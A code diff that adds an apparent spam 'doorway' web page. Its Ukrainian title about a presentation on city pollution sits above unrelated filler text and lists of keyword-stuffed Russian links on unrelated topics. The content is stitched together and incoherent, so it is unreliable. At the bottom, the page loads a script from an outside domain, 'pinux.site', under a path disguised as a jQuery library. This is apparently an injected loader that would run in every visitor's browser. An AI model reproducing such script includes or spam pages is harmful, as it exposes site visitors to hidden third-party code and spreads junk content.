@@ -1,0 +1,142 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Презентація на тему забруднення міст україни - aejoadaera.xemlock.pl</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">aejoadaera.xemlock.pl</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Презентація на тему забруднення міст україни</h2>
+                            </header>
+                            <p>Екскурсія для молоді району у Навчальний центр Національної гвардії України. Новини Ужгорода - події та життя міста сьогодні. Тільки головні і свіжі репортажі, читайте. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="fye-gost-10534-78.html">Гост 10534 78</a></li>
+                                <li><a href="fye-shema-kryuchkom-detskoe-plate.html">Схема крючком детское платье</a></li>
+                                <li><a href="fye-kak-zagruzit-papku-v-oblako-mail-ru.html">Как загрузить папку в облако mail ru</a></li>
+                                <li><a href="fye-feldenkrayz-knigi-kupit.html">Фельденкрайз книги купить</a></li>
+                                <li><a href="fye-skachat-torrent-detskaya-igra-2.html">Скачать торрент детская игра 2</a></li>
+                                <li><a href="fye-kniga-angelov-hraniteley.html">Книга ангелов хранителей</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>Новини Золочівської районної державної адміністрації.</li>
+<li>Новини Ужгорода - головні і актуальні новини сьогодні.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="fye-video-detki-geymer-simulyator-kozla.html">Видео детки геймер симулятор козла</a></li>
+                                            <li><a href="fye-yandeks-algoritm-2015-raspisanie.html">Яндекс алгоритм 2015 расписание</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="fye-gdz-po-6-klassu-po-russkomu-yazyku.html">Гдз по 6 классу по русскому языку</a></li>
+                                            <li><a href="fye-nedelya-mody-v-rossii-2015-raspisanie.html">Неделя моды в россии 2015 расписание</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="fye-predel-tekuchesti-stal-20-gost-1050-88.html">Предел текучести сталь 20 гост 1050 88</a></li>
+                                            <li><a href="fye-volkswagen-passat-b3-dizel-rukovodstvo.html">Volkswagen passat b3 дизель руководство</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="fye-vselennaya-beskonechna-noize-mc-minusovka.html">Вселенная бесконечна noize mc минусовка</a></li>
+                                            <li><a href="fye-skayrim-mod-kniga-alhimicheskih-receptov.html">Скайрим мод книга алхимических рецептов</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
